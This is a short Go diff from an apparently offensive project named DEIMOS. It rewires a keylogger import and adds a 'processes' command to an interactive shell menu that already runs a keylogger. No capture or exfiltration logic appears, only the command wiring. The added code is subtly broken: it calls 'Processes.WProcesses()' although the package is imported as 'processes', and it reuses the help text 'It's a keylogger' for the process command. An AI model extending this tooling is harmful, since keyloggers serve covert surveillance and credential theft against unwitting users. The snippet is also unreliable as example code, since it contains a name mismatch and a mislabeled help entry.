@@ -1,7 +1,8 @@
 package shell
 
 import (
-	keylogger "github.com/MustaphaAlioglou/DEIMOS/util"
+	"github.com/MustaphaAlioglou/DEIMOS/keylogger"
+	"github.com/MustaphaAlioglou/DEIMOS/processes"
 	"github.com/abiosoft/ishell"
 	"os"
 	"fmt"
@@ -22,6 +23,13 @@ func GetShell() {
 				}
 				time.Sleep(5 * time.Millisecond)
 			}
+		},
+		Help: "It's a keylogger",
+	})
+	shell.AddCmd(&ishell.Cmd{
+		Name: "processes",
+		Func: func(c *ishell.Context) {
+			Processes.WProcesses()
 		},
 		Help: "It's a keylogger",
 	})
